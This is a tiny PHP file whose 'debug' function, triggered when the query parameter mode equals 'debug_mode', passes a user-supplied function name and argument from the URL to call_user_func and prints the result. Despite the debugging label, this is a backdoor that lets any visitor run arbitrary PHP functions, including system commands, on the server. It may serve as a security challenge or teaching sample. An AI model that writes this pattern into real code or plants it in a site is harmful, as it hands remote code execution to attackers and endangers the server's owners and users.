<?php
    function debug($arr) {
        var_dump(call_user_func($arr[0],$arr[1]));
    }

    if ($_GET['mode'] === "debug_mode") {
        debug($_GET["debug"]);
    }
?>